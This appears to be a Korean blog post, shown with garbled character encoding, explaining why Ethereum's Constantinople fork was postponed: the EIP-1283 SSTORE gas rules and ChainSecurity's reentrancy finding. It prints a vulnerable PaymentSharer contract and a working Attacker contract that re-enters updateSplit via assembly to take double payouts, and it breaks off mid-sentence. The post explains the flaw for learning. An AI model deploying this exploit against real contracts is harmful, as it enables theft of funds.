---
layout: post
title: "Ethereum Constantinople Postponement"
date: 2019-02-09
img: coex.jpg # Add image post (optional)
description: # Add post description (optional)
tag: [Ethereum, EIP-1283, Constantinople, Solidity]
---

ì˜¬í•´ ì´ˆ 2019ë…„ 1ì›” 16ì¼ ìˆ˜ìš”ì¼ ì¯¤, ë¸”ë¡ ë²ˆí˜¸ 7,080,000 ë¶€í„° ì—…ê·¸ë ˆì´ë“œë  ì˜ˆì •ì´ì—ˆë˜ ì´ë”ë¦¬ì›€ ì½˜ìŠ¤íƒ„í‹°ë…¸í”Œ(Constantinople) í•˜ë“œ í¬í¬ê°€ ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ ì—°ê¸°ë˜ì—ˆìŠµë‹ˆë‹¤. 
[ì´ë”ë¦¬ì›€ ë¸”ë¡œê·¸][etheruem-blog]ë¥¼ í†µí•´ í•˜ë“œí¬í¬ì˜ ê³µì‹ ë°œí‘œ, ê·¸ë¦¬ê³  ChainSecurityì— ì˜í•´ ì œê¸°ëœ ë³´ì•ˆ ì´ìŠˆë¡œ ì¸í•œ í•˜ë“œí¬í¬ ì—°ê¸° ë“± ì¼ë ¨ì˜ ì‚¬ê±´ ì§„í–‰ìƒí™©ì„ ì•Œ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

ì´ë”ë¦¬ì›€ì˜ ê¶ê·¹ì ì¸ ëª©í‘œì¸ Serenityë¡œ ê°€ê¸° ìœ„í•´ ì¤‘ìš”í•œ ì‹œì‘ì ì´ ë  ì´ë²ˆ í•˜ë“œí¬í¬ê°€ ì—°ê¸°ëœ ì´ìœ ëŠ” ì ìš© ëŒ€ìƒì´ì—ˆë˜ ì´ë”ë¦¬ì›€ ê°œì„  ì œì•ˆ(EIP)ë“¤ 
ì¤‘ [EIP-1283][eip-1283]ì— "reentrancy"ë¼ê³  ì•Œë ¤ì§„ ë³´ì•ˆ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

EIP-1283ì˜ ë‚´ìš©ì€, ê°„ë‹¨íˆ ë§í•˜ë©´, ì´ë”ë¦¬ì›€ì˜ EVMì´ ë°ì´í„°ë¥¼ ì €ì¥í•  ë•Œ ì§€ë¶ˆí•´ì•¼ í•˜ëŠ” ì‚¬ìš©ë£Œ(usage)ì— ëŒ€í•œ ë³€ê²½ì´ì—ˆìŠµë‹ˆë‹¤. EIP-1283ì˜ ë°°ê²½ì—ëŠ” ê·¸ ì €ì¥ ë¹„ìš©ì´ 
ë¹„í•©ë¦¬ì ì´ë¼ëŠ” ë¬¸ì œê°€ ìˆì—ˆìŠµë‹ˆë‹¤.

ì´ë”ë¦¬ì›€ì˜ ê¸°ìˆ  ë¬¸ì„œì¸ [ì˜ë¡œìš° í˜ì´í¼][etheruem-yellowpaper]ì—ëŠ” ë°ì´í„° ì €ì¥ opcodeì¸ `SSTORE`ì— ì†Œìš”ë˜ëŠ” ê°€ìŠ¤ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ì •ì˜í•˜ê³  ìˆìŠµë‹ˆë‹¤.


>20000 Paid for an SSTORE operation when the storage value is set to non-zero from zero.
<br/>
5000 Paid for an SSTORE operation when the storage value's zeroness remains unchanged or is set to zero.
<br/>
15000 Refund given (added into refund counter) when the storage value is set to zero from non-zero.

ì˜ì—­í•˜ë©´ ìµœì´ˆ ì¸ì„œíŠ¸í•  ë•Œ 20,000 gasë¥¼ ë‚´ì•¼í•˜ê³  ê·¸ ê°’ì„ ì—…ë°ì´íŠ¸í•  ë•ŒëŠ” 5,000 gas, ê·¸ë¦¬ê³  NULLë¡œ ë§Œë“¤ë©´ 15,000 gasë¥¼ ë˜ëŒë ¤ ì¤€ë‹¤ëŠ” ë§ì´ ë˜ê² ìŠµë‹ˆë‹¤.  

ì´ë”ë¦¬ì›€ì€ 32ë°”ì´íŠ¸ í¬ê¸°ì˜ "ìŠ¬ë¡¯"ì´ë¼ëŠ” ì €ì¥ ë‹¨ìœ„ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ìŠ¬ë¡¯ì— ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ë¹„ìš©ì€ 20,000 gasì¸ë°, 32ë°”ì´íŠ¸ í¬ê¸°ë¥¼ ê³ ë ¤í•  ë•Œ ê½¤ ë¹„ì‹¸ë‹¤ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ë˜ì„œ ì´ë”ë¦¬ì›€ì„ ë°ì´í„°ë² ì´ìŠ¤ë¡œ ìƒê°í•˜ê³  ë°œìƒí•˜ëŠ” ëª¨ë“  íŠ¸ëœì­ì…˜ ë°ì´í„°ë¥¼ ì €ì¥í•˜ë ¤ëŠ” ê²ƒì€ ê·¸ë¦¬ ì¢‹ì€ ìƒê°ì´ ì•„ë‹™ë‹ˆë‹¤).  

ì´ë ‡ê²Œ "ì €ì¥"ì´ë¼ëŠ” ê¸°ëŠ¥ì— ê³ ë¹„ìš©ì„ ì±…ì •í•œ ì´ìœ ëŠ” ë¸”ë¡ì²´ì¸ì´ ë„ˆë¬´ ë§ì€ ë°ì´í„°ë¥¼ ë“¤ê³  ìˆëŠ” ê²ƒì€ ë¸”ë¡ì²´ì¸ì˜ ìì›ì„ ë‚­ë¹„í•˜ëŠ” ì¼ì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
ê·¸ëŸ¬ë‚˜ í•œ í¸ì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê²½ìš°ë¥¼ ìƒê°í•´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> A contract with empty storage that increments slot 0 5 times will be charged 20000 + 5 * 5000 = 45000 gas, despite this sequence of operations requiring no more disk activity than a single write, charged at 20000 gas.  

ìœ„ì˜ ì˜ˆëŠ” ì‹¤ì œë¡œ ì‚¬ìš©í•˜ëŠ” ìŠ¬ë¡¯ì€ í•˜ë‚˜ì¸ë° ë¹ˆë²ˆí•œ ì—…ë°ì´íŠ¸ë¡œ ì¸í•œ ê³¼ë„í•œ ë¹„ìš©ì˜ ë°œìƒ(excessive gas cost)ì€ ë¹„í•©ë¦¬ì ì´ë¼ëŠ” ë§ì´ ë˜ê² ìŠµë‹ˆë‹¤.


## EIP 1283: Net gas metering for SSTORE without dirty maps 

ì, ê·¸ë˜ì„œ EIP-1283ì˜ ì œëª©ê³¼ ê°™ì€ ê°œì„  ìš”êµ¬ê°€ ì œì•ˆë˜ì—ˆìŠµë‹ˆë‹¤. "dirty"ë¼ëŠ” ì˜ë¯¸ëŠ” (ì˜¤ë¼í´ì˜ dirty block ğŸ˜‰) ë””ìŠ¤í¬ì— ê¸°ë¡ëœ ê²ƒì„ ì—¬ëŸ¬ë²ˆ ì½ê³  ì“´ë‹¤ëŠ” 
ì˜ë¯¸ê°€ ë˜ê² ìŠµë‹ˆë‹¤. ì¦‰ "<i>without dirty maps</i>"ì´ë€ ì—¬ëŸ¬ ë²ˆ ì¨ë„ ë§ˆì¹˜ í•œ ë²ˆë§Œ ì“´ ê²ƒì²˜ëŸ¼ "ê°€ìŠ¤ ê³„ì‚°(gas metering)"ì„ í•˜ë„ë¡ ê°œì„ í•˜ë ¤ëŠ” ì‹œë„ë¼ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


>This EIP proposes net gas metering changes for SSTORE opcode, enabling new usages for contract storage, and reducing excessive gas costs where it doesnâ€™t match how most implementation works.

>This acts as an alternative for EIP-1087, where it tries to be friendlier to implementations that use different optimization strategies for storage change caches.

ì§ì‘ì»¨ë°, ì´ëŸ¬í•œ ë¹„ìš© ì‚°ì • êµ¬í˜„ ë¡œì§ì€ ì´ë”ë¦¬ì›€ êµ¬í˜„ì²´-ë…¸ë“œ ë§ˆë‹¤ ì°¨ì´ê°€ ìˆì—ˆë˜ ê²ƒ ê°™ìŠµë‹ˆë‹¤. ê¸°ì¡´ êµ¬í˜„ì²´ì˜ ë³€ê²½ì‚¬í•­ì„ ìµœì†Œí™”í•˜ëŠ” ê²ƒì„ ê³ ë ¤í•˜ì—¬ ì•„ë˜ì™€ ê°™ì€ ì •ë³´ë¥¼ 
ì‚¬ìš©í•˜ì—¬ ê°€ìŠ¤ë¥¼ ì±…ì •í•  ê²ƒì…ë‹ˆë‹¤.

* Storage slotâ€™s original value.
* Storage slotâ€™s current value.
* Refund counter.

EIP-1283ì€ ì´ë“¤ ì •ë³´ë¥¼ í™œìš©í•˜ì—¬ ë‹¤ìŒ ë™ì‘ì— ëŒ€í•´ í•©ë¦¬ì ì¸ ê°€ìŠ¤ ë¹„ìš©ì„ "ì²­êµ¬"í•  ìˆ˜ ìˆì„ ê²ƒì´ë¼ê³  ì œì•ˆí–ˆìŠµë‹ˆë‹¤. ì•ì„œ ì–¸ê¸‰í•œ ì¦ì€ ì—…ë°ì´íŠ¸ë¡œ ì¸í•œ ê³¼ë„í•œ ê°€ìŠ¤ ì†Œëª¨ë¥¼ 
ê°œì„ í•˜ë ¤ëŠ” ëª©ì ì„ í¬í•¨í•´ì„œ ë§ì…ë‹ˆë‹¤.

* Subsequent storage write operations within the same call frame. This includes reentry locks, same-contract multi-send, etc.
* Exchange storage information between sub call frame and parent call frame, where this information does not need to be persistent outside of a transaction. This includes sub-frame error codes and message passing, etc.

ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ìš°ì„  ê°€ìŠ¤ ë¹„ìš© ì±…ì •ì˜ ê¸°ì¤€ì´ ë˜ëŠ” ì •ë³´ë“¤ì— ëŒ€í•œ ì •ì˜ì…ë‹ˆë‹¤.

* Storage slotâ€™s <b>original value</b>: This is the value of the storage if a reversion happens on the current transaction.
* Storage slotâ€™s <b>current value</b>: This is the value of the storage before SSTORE operation happens.
* Storage slotâ€™s <b>new value</b>: This is the value of the storage after SSTORE operation happens.

<ul>
<li>ì´ˆê¸° ê°’(original value)ì´ë€ íŠ¸ëœì­ì…˜ì´ ë¡¤ë°±ë˜ì—ˆì„ ë•Œ ë³µì›ë˜ëŠ” ê°’ì„ ë§í•©ë‹ˆë‹¤.</li>
<li>í˜„ì¬ ê°’(current value)ì´ë€ SSTOREê°€ ì‹¤í–‰ë˜ê¸° ì „ì˜ ê°’ì„ ë§í•©ë‹ˆë‹¤.</li>
<li>ë³€ê²½ ê°’(new value)ì´ë€ SSTOREê°€ ì‹¤í–‰ëœ í›„ì˜ ê°’ì„ ë§í•©ë‹ˆë‹¤.</li>
</ul>

ë‹¤ì‹œ ë§í•´ì„œ íŠ¸ëœì­ì…˜ì— ì˜í•´ ì €ì¥ ìŠ¬ë¡¯ì˜ ê°’ì„ ì—¬ëŸ¬ ë²ˆ ë³€ê²½í•  ìˆ˜ ìˆëŠ”ë°, ê·¸ë ‡ê²Œ ë³€ê²½ë˜ëŠ” ê°’ì˜ ì„±ê²©ì„ êµ¬ë¶„í•˜ì—¬ ê°€ìŠ¤ ì†Œëª¨ë¥¼ ì°¨ë“± ì ìš©í•˜ê² ë‹¤ëŠ” ì˜ë¯¸ê°€ ë˜ê² ìŠµë‹ˆë‹¤. 
í˜„ì¬ ê°’ê³¼ ìƒˆë¡œìš´ ê°’ì˜ ì¼ì¹˜ ì—¬ë¶€ë¥¼ êµ¬ë¶„í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ë¶„ê¸°í•©ë‹ˆë‹¤.

<b>(1) If current value equals new value (this is a no-op), 200 gas is deducted.</b> 

í˜„ì¬ ê°’ì´ ë³€ê²½ ê°’ê³¼ ê°™ìœ¼ë©´(no-op), 200 gasë¥¼ ê³µì œí•©ë‹ˆë‹¤.

<b>(2) If current value does not equal new value</b> 

í˜„ì¬ ê°’ì´ ë³€ê²½ ê°’ê³¼ ê°™ì§€ ì•Šì€ ê²½ìš°ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¶„ê¸°í•©ë‹ˆë‹¤.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2.1) If original value equals current value (this storage slot has not been changed by the current execution context)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ê³¼ í˜„ì¬ ê°’ì´ ê°™ë‹¤ë©´(ê°’ì´ ë°”ë€ ì ì´ ì—†ëŠ” ê²½ìš°)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.1.1) If original value is 0, 20000 gas is deducted.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ì´ 0ì´ì—ˆë‹¤ë©´ 20000 gasë¥¼ ê³µì œí•©ë‹ˆë‹¤(ì´ ê²½ìš°ëŠ” ìµœì´ˆë¡œ ìŠ¬ë¡¯ì— 0ì´ ì•„ë‹Œ ê°’ì„ ì €ì¥í•˜ëŠ” ê²½ìš°ê°€ ë˜ê² ìŠµë‹ˆë‹¤).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.1.2) Otherwise, 5000 gas is deducted. If new value is 0, add 15000 gas to refund counter.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ 5000 gasë¥¼ ê³µì œí•©ë‹ˆë‹¤. ìƒˆë¡œìš´ ê°’ì´ 0ì´ë¼ë©´ 15000 gasë¥¼ ë˜ëŒë ¤ ì¤ë‹ˆë‹¤. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2) If original value does not equal current value (this storage slot is dirty), 200 gas is deducted.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ì´ í˜„ì¬ ê°’ê³¼ ê°™ì§€ ì•Šë‹¤ë©´(ê°’ì´ ë°”ë€ ì ì´ ìˆëŠ” ê²½ìš°, dirty slot) 200 gasë¥¼ ê³µì œí•©ë‹ˆë‹¤. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ ê²½ìš°ì—ëŠ” ì•„ë˜ ì¡°ê±´ì— ì˜í•´ ê°€ìŠ¤ë¥¼ í™˜ì› ì²˜ë¦¬í•©ë‹ˆë‹¤.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1) If original value is not 0

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ì´ 0ì´ ì•„ë‹ˆë¼ë©´

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1.A) If current value is 0 (also means that new value is not 0), remove 15000 gas from refund counter. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; í˜„ì¬ ê°’ì´ 0ì´ë©´ ê³µì œëœ 15000 gasë¥¼ ì‚­ì œí•©ë‹ˆë‹¤. í˜„ì¬ ê°’ì´ 0ì´ë¼ë©´ ì „ì— 15000 gasë¥¼ ë˜ëŒë ¤ ë°›ì•˜ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.1.B) If new value is 0 (also means that current value is not 0), add 15000 gas to refund counter.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ë³€ê²½ ê°’ì´ 0ì´ë¼ë©´ 15000 gasë¥¼ ë˜ëŒë ¤ ì¤ë‹ˆë‹¤.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2) If original value equals new value (this storage slot is reset)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ê³¼ ë³€ê²½ ê°’ì´ ê°™ë‹¤ë©´(ìŠ¤í† ë¦¬ì§€ ë¦¬ì…‹)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2.A) If original value is 0, add 19800 gas to refund counter.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ì´ˆê¸° ê°’ì´ 0ì´ë¼ë©´ 19800 gasë¥¼ ë˜ëŒë ¤ ì¤ë‹ˆë‹¤.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (2.2.2.B)  Otherwise, add 4800 gas to refund counter.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ê·¸ë ‡ì§€ ì•Šìœ¼ë©´ 4800 gasë¥¼ ë˜ëŒë ¤ì¤ë‹ˆë‹¤.

ì¼€ì´ìŠ¤ë³„ë¡œ ë³µì¡í•˜ê²Œ ë¶„ê¸°ë˜ì–´ ìˆì§€ë§Œ SSTOREê°€ ë‹¤ìŒê³¼ ê°™ì€ ìŠ¬ë¡¯ ìƒíƒœì— ì ìš©ë˜ëŠ” ê²½ìš°ë¥¼ ë‚˜ëˆ„ì–´ ìƒê°í•œ ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* <b>No-op</b>: the virtual machine does not need to do anything. This is the case if current value equals new value.
* <b>Fresh</b>: this storage slot has not been changed, or has been reset to its original value. This is the case if current value does not equal new value, and original value equals current value.
* <b>Dirty</b>: this storage slot has already been changed. This is the case if current value does not equal new value, and original value does not equal current value.

No-opëŠ” í˜„ì¬ ê°’ì„ ë™ì¼í•œ ê°’ìœ¼ë¡œ ë³€ê²½í•˜ëŠ” ê²ƒì´ë¯€ë¡œ ì‚¬ì‹¤ìƒ EVMì€ ì•„ë¬´ê²ƒë„ í•  í•„ìš”ê°€ ì—†ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. FreshëŠ” ì²˜ìŒ ì‚¬ìš©, ë˜ëŠ” ë¦¬ì…‹ì´ ëœ ìƒíƒœì…ë‹ˆë‹¤. DirtyëŠ” ì ì–´ë„ í•œ ë²ˆ ì´ìƒ ì‚¬ìš©ëœ, ì´ë¯¸ ë³€ê²½ ê°’ìœ¼ë¡œ ì—…ë°ì´íŠ¸ëœ ê²½ìš°ë¼ê³  í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ì´ëŸ¬í•œ ì°¨ë“± ì¡°ê±´ì— ë”°ë¼ ê°€ìŠ¤ë¥¼ í™˜ì›í•˜ì—¬ ê³¼ë„í•œ ê°€ìŠ¤ ì†Œëª¨ë¥¼ ë§‰ëŠ” ê²ƒì´ EIP-1283ì˜ ì›ë˜ ëª©ì ì´ì—ˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¼ ì•ì—ì„œ ì–¸ê¸‰í•œ ë¬¸ì œë¥¼ ë‹¤ì‹œ ì˜ˆë¡œ ë“¤ì–´ ê°€ìŠ¤ ì†Œëª¨ëŸ‰ 45000ì—ì„œ ì–¼ë§ˆë‚˜ ì ˆì•½ë˜ëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. ìµœì´ˆ ì“°ê¸°ëŠ” 20000 gasê°€ ì†Œëª¨ë˜ê³  ê·¸ ì´í›„ë¡œ ë³€ê²½ ê°’ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•  ë•Œë§ˆë‹¤ 200 gasê°€ ì ìš©ë  ê²ƒì…ë‹ˆë‹¤.

> A contract with empty storage that increments slot 0 5 times will be charged 20000 + 5 * 200 = 21000 gas


### Whatâ€™s wrong with this code?

ì´ì œ ChainSecurityê°€ ë°œê²¬í•œ EIP-1283ì´ ê°€ì§„ [ë³´ì•ˆ ì·¨ì•½ì„± ë¬¸ì œ][eip-1283-reentrancy]ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤. EIP-1283ì´ ì ìš©ë˜ì—ˆì„ ê²½ìš°ì— "reentrancy"ê°€ ë°œìƒí•˜ëŠ” ì»¨íŠ¸ë™íŠ¸ë¥¼ ì˜ˆë¡œ ë“¤ê³  ìˆìŠµë‹ˆë‹¤.

{% highlight javascript %}

pragma solidity ^0.5.0;

contract PaymentSharer {
      
      mapping(uint => uint) splits;
      mapping(uint => uint) deposits;
      mapping(uint => address payable) first;
      mapping(uint => address payable) second;
    
      function init(uint id, address payable _first, address payable _second) public {
          require(first[id] == address(0) && second[id] == address(0));
          require(first[id] == address(0) && second[id] == address(0));
          first[id] = _first;
          second[id] = _second;
      }
    
      function deposit(uint id) public payable {
          deposits[id] += msg.value;
      }
    
      function updateSplit(uint id, uint split) public {
          require(split <= 100);
          splits[id] = split;
      }
    
      function splitFunds(uint id) public {
          // Here would be: 
          // Signatures that both parties agree with this split
    
          // Split
          address payable a = first[id];
          address payable b = second[id];
          uint depo = deposits[id];
          deposits[id] = 0;
    
          a.transfer(depo * splits[id] / 100);
          b.transfer(depo * (100 - splits[id]) / 100);
      }
}
{% endhighlight %}

ì´ ì»¨íŠ¸ë™íŠ¸ëŠ” `init()` í•¨ìˆ˜ì—ì„œ _firstì™€ _second ê³„ì •ì„ íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬ë°›ì•„ì„œ íŠ¹ì • ì•„ì´ë””ë¥¼ í‚¤ë¡œ í•˜ì—¬ mapping íƒ€ì…ì˜ ìƒíƒœ ë³€ìˆ˜ firstì™€ secondì— ê°ê° ì €ì¥í•©ë‹ˆë‹¤.
`deposit()` í•¨ìˆ˜ë¥¼ í†µí•´ì„œ ì»¨íŠ¸ë™íŠ¸ì— ì´ë”ë¥¼ ì ë¦½í•©ë‹ˆë‹¤. ì ë¦½ëœ ì´ë”ëŠ” depositsë¼ëŠ” mapping íƒ€ì…ì˜ ì¥ë¶€ì— ì €ì¥ë©ë‹ˆë‹¤.

`updateSplit()`ëŠ” ì´ë ‡ê²Œ ì ë¦½ëœ ì´ë”ë¥¼ _firstì™€ _second ê³„ì •ì—ê²Œ ë°°ë¶„í•˜ëŠ” ë¹„ìœ¨ì„ ì •í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. _first ê³„ì •ì´ ê°€ì ¸ê°ˆ ë¹„ìœ¨ì„ %ë‹¨ìœ„ë¡œ ì§€ì •í•˜ë©´ ë‚˜ë¨¸ì§€ëŠ” 
_second ê³„ì •ì´ ë°›ê²Œ ë  ê²ƒì…ë‹ˆë‹¤. `splitFunds()`ëŠ” ê·¸ë ‡ê²Œ ê³„ì‚°ëœ ì´ë”ë¥¼ ì†¡ê¸ˆí•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤. 

ë‹¤ìŒì—ëŠ” ê³µê²©ì ì»¨íŠ¸ë™íŠ¸ì…ë‹ˆë‹¤.

{% highlight javascript %}

pragma solidity ^0.5.0;

import "./PaymentSharer.sol";

contract Attacker {
      address private victim;
      address payable owner;
    
      constructor() public {
          owner = msg.sender;
      }
    
      function attack(address a) external {
          victim = a;
          PaymentSharer x = PaymentSharer(a);
          x.updateSplit(0, 100);
          x.splitFunds(0);
      }
    
      function () payable external {
          address x = victim;
          assembly{
              mstore(0x80, 0xc3b18fb600000000000000000000000000000000000000000000000000000000)
              pop(call(10000, x, 0, 0x80, 0x44, 0, 0))
          }    
      }
    
      function drain() external {
          owner.transfer(address(this).balance);
      }
}
{% endhighlight %}

ì—¬ëŠ ê³µê²©ì ì»¨íŠ¸ë™íŠ¸ê°€ ê·¸ë ‡ë“¯ì´, ê³µê²©ëŒ€ìƒì´ ë˜ëŠ” PaymentSharer.sol ì»¨íŠ¸ë™íŠ¸ë¥¼ ì°¸ì¡°í•©ë‹ˆë‹¤. ê³µê²©ìëŠ” ê°ê° _first, _second ì»¨íŠ¸ë™íŠ¸ ê³„ì •ì„ 
ë§Œë“¤ì–´ì„œ ì •ìƒì ìœ¼ë¡œ ì„ì˜ì˜ ì´ë”ë¥¼ ì´ ì»¨íŠ¸ë™íŠ¸ì— ì ë¦½í•©ë‹ˆë‹¤.

ì´ì œ `attack()`í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ì—°ì†ì ìœ¼ë¡œ, í•˜ë‚˜ì˜ íŠ¸ëœì­ì…˜ìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. Attacker ì»¨íŠ¸ë™íŠ¸ê°€ _first ê³„ì •ì´ ë  ê²ƒì…ë‹ˆë‹¤.

1. ê³µê²©ìëŠ” `updateSplit()`ì„ ì‹¤í–‰í•˜ì—¬ ë°°ë¶„ ì¥ë¶€ splitsì— _firstê³„ì •ì´ 100%ì˜ ì´ë”ë¥¼ ê°€ì ¸ê°€ë„ë¡ ì„¤ì • í•©ë‹ˆë‹¤.

2. ê³µê²©ìëŠ” `splitFunds()`ë¥¼ í˜¸ì¶œí•˜ì—¬ ì†¡ê¸ˆì„ ì§„í–‰í•©ë‹ˆë‹¤.

3. ì†¡ê¸ˆë˜ëŠ” ì´ë”ëŠ” ê³µê²©ìì˜ ì»¨íŠ¸ë™íŠ¸ Attacker, ì¦‰ _first ê³„ì •ì´ ë°›ê²Œ ë˜ëŠ”ë° ì´ ë•Œ fallback payable í•¨ìˆ˜ê°€ í˜¸ì¶œë©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ë‹¤ì‹œ `updateSplit()`ìœ¼ë¡œ 
ì´ë²ˆì—ëŠ” _first ê³„ì •ì— 0% ë°°ë¶„ì„ ì§€ì •í•˜ì—¬ _second ê³„ì •ì´ ì´ë”ë¥¼ ëª¨ë‘ ë°›ë„ë¡ í•©ë‹ˆë‹¤(ì—¬ê¸°ì„œëŠ” ì†”ë¦¬ë””í‹° ì–´ì…ˆë¸”ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í•¨ìˆ˜ ì‹œê·¸ë„ˆì²˜ 0xc3b18fb6 = bytes4(keccak256("updateSplit(uint256,uint256)"))ë¡œ í˜¸ì¶œí•˜ì˜€ìŠµë‹ˆë‹¤). 
 
4. `splitFunds()`ëŠ” ì•„ì§ ì‹¤í–‰ì¤‘ì´ê³  ìƒíƒœ ë³€ìˆ˜ splitsì´ ë³€ê²½ë˜ë©´ì„œ _second ê³„ì •ìœ¼ë¡œë„ 100% ë°°ë¶„ì´ ë‹¤ì‹œ ì†¡ê¸ˆë©ë‹ˆë‹¤.

ìš”ì•½í•˜ë©´, ì´ë¯¸ _first ê³„ì •ì— 100%ì˜ ì´ë”ê°€ ëª¨ë‘ ì „ì†¡ë˜ì—ˆìŒì—ë„ ê³µê²©ìì˜ fallback í•¨ìˆ˜ì—ì„œ `updateSplit()`ì„ ë‹¤ì‹œ í˜¸ì¶œí•˜ë©´ì„œ(reentrancy) ë‘ ë²ˆì§¸ ê³„ì •ì—ê²Œë„ 100%ì˜ 
